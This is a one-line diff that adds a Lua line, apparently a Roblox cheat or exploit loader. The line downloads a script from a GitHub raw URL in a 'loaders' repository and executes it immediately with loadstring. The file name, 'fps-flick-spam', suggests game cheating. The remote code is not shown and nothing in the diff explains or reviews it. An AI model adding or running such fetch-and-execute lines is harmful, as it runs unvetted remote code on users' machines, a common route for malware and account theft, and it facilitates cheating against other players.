@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Bravedersolve/loaders/main/loaders/fps-flick-spam1-jfuhoga7kpel5a.lua"))()
